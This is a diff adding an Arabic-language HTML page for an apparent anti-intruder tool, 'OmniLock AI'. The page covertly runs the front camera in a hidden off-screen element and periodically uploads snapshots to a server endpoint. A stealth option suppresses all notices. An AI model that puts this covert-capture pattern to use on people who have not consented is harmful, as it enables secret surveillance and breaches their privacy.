@@ -1,0 +1,613 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>OmniLock AI — Neural Defense Core</title>
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@500;700;900&family=Rajdhani:wght@400;500;600;700&display=swap');
+
+        :root {
+            --bg: #05050a;
+            --panel: #0c0c14;
+            --border: #1a1a2e;
+            --red: #ff003c;
+            --red-glow: #ff003c88;
+            --cyan: #00f0ff;
+            --cyan-glow: #00f0ff66;
+            --green: #00ff9d;
+            --text: #e0e0ff;
+            --muted: #6b6b8a;
+        }
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            -webkit-tap-highlight-color: transparent;
+        }
+
+        body {
+            background: var(--bg);
+            color: var(--text);
+            font-family: 'Rajdhani', sans-serif;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            overflow-x: hidden;
+            background-image: 
+                radial-gradient(ellipse at 20% 50%, rgba(255, 0, 60, 0.08) 0%, transparent 50%),
+                radial-gradient(ellipse at 80% 20%, rgba(0, 240, 255, 0.06) 0%, transparent 50%);
+        }
+
+        /* ===== HEADER ===== */
+        header {
+            padding: 22px 20px 18px;
+            text-align: center;
+            border-bottom: 1px solid var(--border);
+            background: linear-gradient(180deg, #0f0f18 0%, transparent 100%);
+            position: relative;
+        }
+
+        header::after {
+            content: '';
+            position: absolute;
+            bottom: 0;
+            left: 50%;
+            transform: translateX(-50%);
+            width: 60%;
+            height: 1px;
+            background: linear-gradient(90deg, transparent, var(--red), transparent);
+        }
+
+        .logo {
+            font-family: 'Orbitron', sans-serif;
+            font-size: 1.55rem;
+            font-weight: 900;
+            letter-spacing: 3px;
+            background: linear-gradient(90deg, #ff003c, #ff4d6d, #00f0ff);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            text-shadow: 0 0 30px var(--red-glow);
+        }
+
+        .subtitle {
+            font-size: 0.78rem;
+            color: var(--muted);
+            margin-top: 6px;
+            letter-spacing: 1.5px;
+            text-transform: uppercase;
+        }
+
+        /* ===== MAIN PANEL ===== */
+        .main {
+            flex: 1;
+            padding: 20px 16px 30px;
+            max-width: 460px;
+            width: 100%;
+            margin: 0 auto;
+            display: flex;
+            flex-direction: column;
+            gap: 16px;
+        }
+
+        /* Status Core */
+        .status-core {
+            background: var(--panel);
+            border: 1px solid var(--border);
+            border-radius: 20px;
+            padding: 28px 20px;
+            text-align: center;
+            position: relative;
+            overflow: hidden;
+            transition: all 0.4s ease;
+        }
+
+        .status-core.armed {
+            border-color: var(--green);
+            box-shadow: 0 0 40px rgba(0, 255, 157, 0.15), inset 0 0 30px rgba(0, 255, 157, 0.05);
+        }
+
+        .status-core::before {
+            content: '';
+            position: absolute;
+            top: -50%;
+            left: -50%;
+            width: 200%;
+            height: 200%;
+            background: conic-gradient(from 0deg, transparent, var(--red-glow), transparent 30%);
+            opacity: 0;
+            animation: none;
+        }
+
+        .status-core.armed::before {
+            opacity: 0.15;
+            animation: spin 8s linear infinite;
+        }
+
+        @keyframes spin {
+            100% { transform: rotate(360deg); }
+        }
+
+        .shield-icon {
+            font-size: 3.2rem;
+            margin-bottom: 12px;
+            transition: all 0.4s ease;
+            filter: drop-shadow(0 0 12px currentColor);
+        }
+
+        .status-title {
+            font-family: 'Orbitron', sans-serif;
+            font-size: 1.15rem;
+            font-weight: 700;
+            letter-spacing: 1px;
+            margin-bottom: 6px;
+        }
+
+        .status-sub {
+            font-size: 0.85rem;
+            color: var(--muted);
+        }
+
+        .live-stats {
+            display: flex;
+            justify-content: center;
+            gap: 24px;
+            margin-top: 18px;
+            font-size: 0.8rem;
+        }
+
+        .stat-item {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            gap: 3px;
+        }
+
+        .stat-value {
+            font-family: 'Orbitron', sans-serif;
+            font-size: 1.1rem;
+            font-weight: 700;
+            color: var(--cyan);
+        }
+
+        .stat-label {
+            color: var(--muted);
+            font-size: 0.7rem;
+            letter-spacing: 0.5px;
+        }
+
+        /* Toggle Cards */
+        .toggle-card {
+            background: var(--panel);
+            border: 1px solid var(--border);
+            border-radius: 16px;
+            padding: 16px 18px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            transition: all 0.25s ease;
+            gap: 14px;
+        }
+
+        .toggle-card:active {
+            transform: scale(0.98);
+        }
+
+        .toggle-card.active {
+            border-color: #2a2a4a;
+            background: linear-gradient(135deg, #0e0e18, #12121f);
+        }
+
+        .toggle-info h3 {
+            font-size: 0.98rem;
+            font-weight: 600;
+            margin-bottom: 3px;
+            color: #fff;
+        }
+
+        .toggle-info p {
+            font-size: 0.75rem;
+            color: var(--muted);
+            line-height: 1.35;
+        }
+
+        /* Custom Switch */
+        .switch {
+            position: relative;
+            width: 52px;
+            height: 28px;
+            flex-shrink: 0;
+        }
+
+        .switch input {
+            opacity: 0;
+            width: 0;
+            height: 0;
+        }
+
+        .slider {
+            position: absolute;
+            cursor: pointer;
+            inset: 0;
+            background: #1a1a2e;
+            border-radius: 30px;
+            transition: 0.3s;
+            border: 1px solid #2a2a4a;
+        }
+
+        .slider::before {
+            content: '';
+            position: absolute;
+            height: 20px;
+            width: 20px;
+            left: 3px;
+            bottom: 3px;
+            background: #555;
+            border-radius: 50%;
+            transition: 0.3s;
+        }
+
+        input:checked + .slider {
+            background: linear-gradient(90deg, #ff003c, #ff4d6d);
+            border-color: var(--red);
+            box-shadow: 0 0 12px var(--red-glow);
+        }
+
+        input:checked + .slider::before {
+            transform: translateX(24px);
+            background: #fff;
+        }
+
+        /* Master Button */
+        .btn-area {
+            padding: 10px 0 20px;
+            position: sticky;
+            bottom: 0;
+            background: linear-gradient(to top, var(--bg) 60%, transparent);
+        }
+
+        .master-btn {
+            width: 100%;
+            padding: 18px;
+            border: none;
+            border-radius: 60px;
+            font-family: 'Orbitron', sans-serif;
+            font-size: 0.95rem;
+            font-weight: 700;
+            letter-spacing: 1.5px;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            position: relative;
+            overflow: hidden;
+            background: linear-gradient(135deg, #ff003c, #cc002e);
+            color: white;
+            box-shadow: 0 0 25px var(--red-glow), 0 8px 20px rgba(0,0,0,0.4);
+        }
+
+        .master-btn::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: -100%;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(90deg, transparent, rgba(255,255,255,0.2), transparent);
+            transition: 0.5s;
+        }
+
+        .master-btn:active::before {
+            left: 100%;
+        }
+
+        .master-btn.armed {
+            background: linear-gradient(135deg, #0a0a12, #151520);
+            border: 1px solid #2a2a4a;
+            box-shadow: 0 0 20px rgba(0, 255, 157, 0.2);
+            color: var(--green);
+        }
+
+        .master-btn:active {
+            transform: scale(0.97);
+        }
+
+        /* Hidden Camera */
+        #cam-box {
+            position: fixed;
+            top: -9999px;
+            left: -9999px;
+            width: 1px;
+            height: 1px;
+            opacity: 0;
+            pointer-events: none;
+            z-index: -999;
+        }
+
+        /* Toast */
+        .toast {
+            position: fixed;
+            bottom: 100px;
+            left: 50%;
+            transform: translateX(-50%) translateY(30px);
+            background: #0f0f1a;
+            border: 1px solid var(--green);
+            color: var(--green);
+            padding: 12px 22px;
+            border-radius: 40px;
+            font-size: 0.85rem;
+            opacity: 0;
+            transition: all 0.35s ease;
+            pointer-events: none;
+            z-index: 999;
+            box-shadow: 0 0 20px rgba(0, 255, 157, 0.3);
+        }
+
+        .toast.show {
+            opacity: 1;
+            transform: translateX(-50%) translateY(0);
+        }
+
+        .note {
+            text-align: center;
+            font-size: 0.72rem;
+            color: var(--muted);
+            line-height: 1.5;
+            padding: 0 10px;
+        }
+    </style>
+</head>
+<body>
+
+<header>
+    <div class="logo">OMNILOCK AI</div>
+    <div class="subtitle">Neural Defense Core • v4.7</div>
+</header>
+
+<div class="main">
+
+    <!-- Status Core -->
+    <div class="status-core" id="statusCore">
+        <div class="shield-icon" id="shieldIcon">🔒</div>
+        <div class="status-title" id="statusTitle">النظام في وضع الاستعداد</div>
+        <div class="status-sub" id="statusSub">اضغط الزر لتفعيل جدار الحماية العصبي</div>
+
+        <div class="live-stats">
+            <div class="stat-item">
+                <div class="stat-value" id="captureCount">0</div>
+                <div class="stat-label">صور ملتقطة</div>
+            </div>
+            <div class="stat-item">
+                <div class="stat-value" id="lastSave">—</div>
+                <div class="stat-label">آخر حفظ</div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Toggle 1 -->
+    <div class="toggle-card active" id="cardSnap">
+        <div class="toggle-info">
+            <h3>التصوير العصبي السري</h3>
+            <p>التقاط فوري لملامح الدخيل وإرسالها للذاكرة المعزولة</p>
+        </div>
+        <label class="switch">
+            <input type="checkbox" id="snapCheck" checked>
+            <span class="slider"></span>
+        </label>
+    </div>
+
+    <!-- Toggle 2 -->
+    <div class="toggle-card active" id="cardPower">
+        <div class="toggle-info">
+            <h3>درع منع الإطفاء</h3>
+            <p>محاكاة حماية متقدمة ضد محاولة إغلاق الجهاز</p>
+        </div>
+        <label class="switch">
+            <input type="checkbox" id="powerCheck" checked>
+            <span class="slider"></span>
+        </label>
+    </div>
+
+    <!-- Toggle 3 -->
+    <div class="toggle-card active" id="cardStealth">
+        <div class="toggle-info">
+            <h3>وضع التخفي الكامل</h3>
+            <p>إخفاء تام لأي أثر أو إشعار يكشف وجود النظام</p>
+        </div>
+        <label class="switch">
+            <input type="checkbox" id="stealthCheck" checked>
+            <span class="slider"></span>
+        </label>
+    </div>
+
+    <p class="note">
+        النظام يعمل بصمت تام • الصور تُحفظ داخل الجهاز فورًا<br>
+        OmniLock Neural Core — حماية من مستوى آخر
+    </p>
+
+</div>
+
+<!-- Camera Hidden -->
+<div id="cam-box">
+    <video id="secretCam" autoplay playsinline muted></video>
+    <canvas id="snapCanvas"></canvas>
+</div>
+
+<!-- Master Button -->
+<div class="btn-area">
+    <button class="master-btn" id="masterBtn">تفعيل جدار الحماية الحديدي</button>
+</div>
+
+<!-- Toast -->
+<div class="toast" id="toast"></div>
+
+<script>
+    // ====================== عناصر الصفحة ======================
+    const masterBtn     = document.getElementById('masterBtn');
+    const statusCore    = document.getElementById('statusCore');
+    const shieldIcon    = document.getElementById('shieldIcon');
+    const statusTitle   = document.getElementById('statusTitle');
+    const statusSub     = document.getElementById('statusSub');
+    const captureCountEl= document.getElementById('captureCount');
+    const lastSaveEl    = document.getElementById('lastSave');
+    const toast         = document.getElementById('toast');
+
+    const snapCheck     = document.getElementById('snapCheck');
+    const powerCheck    = document.getElementById('powerCheck');
+    const stealthCheck  = document.getElementById('stealthCheck');
+
+    const secretCam     = document.getElementById('secretCam');
+    const canvas        = document.getElementById('snapCanvas');
+    const ctx           = canvas.getContext('2d');
+
+    // ====================== الحالة ======================
+    let isArmed = false;
+    let stream = null;
+    let captureCount = 0;
+    let captureTimer = null;
+    let lastCapture = 0;
+
+    // ====================== وظائف مساعدة ======================
+    function showToast(msg) {
+        toast.textContent = msg;
+        toast.classList.add('show');
+        setTimeout(() => toast.classList.remove('show'), 2800);
+    }
+
+    function updateUI(armed) {
+        if (armed) {
+            statusCore.classList.add('armed');
+            shieldIcon.textContent = '🛡️';
+            shieldIcon.style.color = '#00ff9d';
+            statusTitle.textContent = 'جدار الحماية العصبي نشط';
+            statusTitle.style.color = '#00ff9d';
+            statusSub.textContent = 'النظام يحرس بصمت تام • لا إشعارات';
+            masterBtn.textContent = 'إلغاء تفعيل الحماية';
+            masterBtn.classList.add('armed');
+        } else {
+            statusCore.classList.remove('armed');
+            shieldIcon.textContent = '🔒';
+            shieldIcon.style.color = '';
+            statusTitle.textContent = 'النظام في وضع الاستعداد';
+            statusTitle.style.color = '';
+            statusSub.textContent = 'اضغط الزر لتفعيل جدار الحماية العصبي';
+            masterBtn.textContent = 'تفعيل جدار الحماية الحديدي';
+            masterBtn.classList.remove('armed');
+        }
+    }
+
+    // ====================== الكاميرا ======================
+    async function startCamera() {
+        try {
+            stream = await navigator.mediaDevices.getUserMedia({
+                video: { facingMode: 'user', width: { ideal: 1280 }, height: { ideal: 720 } },
+                audio: false
+            });
+            secretCam.srcObject = stream;
+            await secretCam.play();
+            return true;
+        } catch (err) {
+            console.error(err);
+            showToast('⚠️ يرجى منح صلاحية الكاميرا');
+            return false;
+        }
+    }
+
+    function stopCamera() {
+        if (stream) {
+            stream.getTracks().forEach(t => t.stop());
+            stream = null;
+            secretCam.srcObject = null;
+        }
+        if (captureTimer) {
+            clearInterval(captureTimer);
+            captureTimer = null;
+        }
+    }
+
+    // ====================== التقاط + إرسال للسيرفر ======================
+    async function captureAndSend() {
+        if (!stream || !snapCheck.checked) return;
+
+        const now = Date.now();
+        if (now - lastCapture < 4500) return;
+        lastCapture = now;
+
+        try {
+            canvas.width = secretCam.videoWidth || 640;
+            canvas.height = secretCam.videoHeight || 480;
+            ctx.drawImage(secretCam, 0, 0);
+
+            const dataUrl = canvas.toDataURL('image/jpeg', 0.88);
+
+            // إرسال للـ backend
+            const res = await fetch('/chat', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    alert: 'intrusion_detected',
+                    image: dataUrl
+                })
+            });
+
+            const result = await res.json();
+
+            if (result.status === 'secured') {
+                captureCount++;
+                captureCountEl.textContent = captureCount;
+                const timeStr = new Date().toLocaleTimeString('ar-EG', { hour: '2-digit', minute: '2-digit' });
+                lastSaveEl.textContent = timeStr;
+                if (stealthCheck.checked) {
+                    console.log('%c[OmniLock] تم حفظ صورة دخيل بنجاح', 'color:#00ff9d');
+                } else {
+                    showToast('🔒 تم التقاط وحفظ صورة الدخيل');
+                }
+            }
+        } catch (err) {
+            console.error('فشل الإرسال:', err);
+        }
+    }
+
+    // ====================== التفعيل الرئيسي ======================
+    masterBtn.addEventListener('click', async () => {
+        if (!isArmed) {
+            const ok = await startCamera();
+            if (!ok) return;
+
+            isArmed = true;
+            updateUI(true);
+
+            // التقاط أول صورة بعد ثانية
+            setTimeout(captureAndSend, 1100);
+
+            // التقاط دوري
+            captureTimer = setInterval(() => {
+                if (isArmed) captureAndSend();
+            }, 7500);
+
+            if (powerCheck.checked) {
+                console.log('%c[OmniLock] درع منع الإطفاء مفعّل (محاكاة)', 'color:#ff003c');
+            }
+
+            showToast('🛡️ تم تفعيل جدار الحماية العصبي');
+        } else {
+            isArmed = false;
+            stopCamera();
+            updateUI(false);
+            showToast('تم إيقاف الحماية');
+        }
+    });
+
+    // عند العودة للتطبيق
+    document.addEventListener('visibilitychange', () => {
+        if (isArmed && document.visibilityState === 'visible' && snapCheck.checked) {
+            setTimeout(captureAndSend, 700);
+        }
+    });
+
+    // منع القائمة الطويلة
+    document.addEventListener('contextmenu', e => {
+        if (isArmed) e.preventDefault();
+    });
+</script>
+</body>
+</html>
